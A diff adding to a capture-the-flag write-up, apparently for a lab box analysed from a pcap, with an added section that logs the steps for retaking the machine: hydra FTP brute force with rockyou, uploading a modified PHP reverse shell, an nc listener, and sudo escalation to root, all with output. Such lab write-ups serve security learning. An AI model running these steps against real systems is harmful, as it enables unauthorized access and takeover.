@@ -3,7 +3,7 @@
   <img src="https://github.com/user-attachments/assets/1e1ceab5-338c-4003-a9da-9590ced8f2d4" width="90" height="90" />
 </div>
 <br>
-<p align="center"> <b>Difficulty</b>: ?/10 (???) <b>Completed</b>: ✔️  </p>
+<p align="center"> <b>Difficulty</b>: 1/10 (Very Easy) <b>Completed</b>: ✔️ 23.12.2025 </p>
 
 For this scenario it seems our machine got hacked by an enonymous threat actor. However, we are lucky to have a .pcap file from the attack. We need to determine what happened. 
 
@@ -67,3 +67,107 @@ By using common sense I still was able to determine that this probably would hav
 
 ## Hack your way back into the machine
 
+Since the attacker changed the user's password we have to run a tool like hydra on the FTP service in the hopes that he did not choose a complex password. We might get lucky with a common word list.
+
+```
+root@ip-10-67-102-92:~# hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.67.130.193
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-23 20:19:05
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking ftp://10.67.130.193:21/
+[21][ftp] host: 10.67.130.193   login: jenny   password: 987654321
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-23 20:19:36
+```
+
+And with that we can try to to change the necessary values in the web shell and upload it to the webserver. For that we just try to change the $ip variable to our own IP address and chmod the file if necessary.
+
+```
+root@ip-10-67-102-92:~# ftp 10.67.130.193 
+Connected to 10.67.130.193.
+220 Hello FTP World!
+Name (10.67.130.193:root): jenny
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 1000     1000        10918 Feb 01  2021 index.html
+-rwxrwxrwx    1 1000     1000         5493 Feb 01  2021 shell.php
+226 Directory send OK.
+```
+
+We can see the php file. Let's try to download and modify it's content to later upload it in said directory again.
+
+```
+ftp> get shell.php
+local: shell.php remote: shell.php
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for shell.php (5493 bytes).
+226 Transfer complete.
+5493 bytes received in 0.00 secs (13.1621 MB/s)
+ftp> quit
+221 Goodbye.
+```
+
+After modifying the files IP-Address and port (1337) we can try to upload it in the ftp service again. So after logging in once again, we use the put command
+
+```
+ftp> put shell.php
+local: shell.php remote: shell.php
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+5492 bytes sent in 0.00 secs (163.6744 MB/s)
+```
+
+All that's left to do to run the web shell was accessing it through a web browser by navigating to *http://<ip-address>/shell.php*. The web shell would allow command execution and would use it to send commands to my listener that I set up beforehand.
+
+```
+root@ip-10-67-102-92:~# nc -lvnp 1337
+Listening on 0.0.0.0 1337
+Connection received on 10.67.130.193 48596
+Linux ip-10-67-130-193 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+ 20:49:53 up 46 min,  0 users,  load average: 0.01, 0.10, 0.07
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+```
+
+After reaching this point I was able to gain root privileges by just copying the steps the attacker took himself. It was pretty easy.
+
+```
+$ python3 -c 'import pty; pty.spawn("bin/bash")'
+www-data@ip-10-67-130-193:/$ su jenny
+su jenny
+Password: 987654321
+
+jenny@ip-10-67-130-193:/$ sudo -l
+sudo -l
+[sudo] password for jenny: 987654321
+
+Matching Defaults entries for jenny on ip-10-67-130-193:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jenny may run the following commands on ip-10-67-130-193:
+    (ALL : ALL) ALL
+jenny@ip-10-67-130-193:/$ sudo su
+sudo su
+root@ip-10-67-130-193:/# whoami
+whoami
+root
+```
+
+Now from this point on directory traversal revealed the rest and with it the Reptile directory that hid the flag.txt.
+
+<img width="442" height="312" alt="Bildschirmfoto vom 2025-12-23 22-04-49" src="https://github.com/user-attachments/assets/c26c53c6-f4bc-4095-920b-a41279a1fca1" />
+
+## Lesson Learned
+This box was a great way to get a general understanding of how Wireshark packets can be read, how brute-force attempts can be interpreted and how to filter efficiently to get to the results we were interested in. The basic techniques for exploiting and securing systems was also given, giving insight on FTP brute-forcing, web shell uploads, and privilege escalation to gain root access. It emphasized the importance of understanding vulnerabilities, the risks associated with improper configurations, and the necissity of securing systems against such attacks. I can't recommend this box enough and hope I will get another opportunity to make use of analyzing packets.
